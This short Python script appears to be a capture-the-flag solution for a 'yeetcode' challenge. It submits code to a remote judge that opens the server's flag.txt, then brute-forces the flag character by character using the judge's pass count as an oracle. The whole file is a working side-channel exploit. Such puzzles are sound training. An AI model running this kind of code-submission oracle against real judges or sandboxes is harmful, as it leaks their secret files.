import requests
keyspace = 'etaoinsrhdlucmfywgpbvkxqjz_0123456789ETAOINSRHDLUCMFYWGPBVKXQJZ{}'
flag = "corctf{"

# len of flag is 33 --> leaked viua burp suit sniper

for i in range(26):
    
    for k in keyspace:
        resp = requests.post("https://yeetcode.be.ax/yeetyeet",'''def f(x,y):

          flag = "{insert}"
          with open('./flag.txt') as f:
            z = f.read()
          if flag in z:

            return x + y'''.format(insert = flag + k))
        
        if '''"p":10''' in resp.text:
            flag += k
            print(flag)
            break
print(flag)